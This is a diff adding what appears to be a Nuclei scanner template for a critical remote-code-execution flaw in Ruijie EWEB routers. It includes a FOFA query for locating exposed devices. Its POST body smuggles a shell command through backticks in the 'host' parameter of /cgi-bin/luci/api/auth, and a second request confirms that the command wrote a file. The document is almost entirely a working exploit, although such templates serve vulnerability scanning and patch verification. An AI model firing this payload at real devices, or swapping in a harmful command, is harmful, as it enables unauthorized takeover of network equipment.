@@ -1,0 +1,31 @@
+id: ruijie_EWEB_route_auth_rce
+
+info:
+  name: ruijie_EWEB_route_auth_rce
+  author: PokerSec
+  severity: critical
+  metadata:
+    fofa-query: fofabody="cgi-bin/luci" && body="#f47f3e"
+  tags: ruijie, EWEB, rce
+variables:
+  a1: "{{randstr}}"
+  a2: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/luci/api/auth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"method":"checkNet","params":{"host":"`echo {{a1}}>{{a2}}.txt`"}}
+      - |
+        GET /cgi-bin/{{a2}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+    matchers:
+      - type: word
+        words:
+          - "{{a1}}"
+        part: body
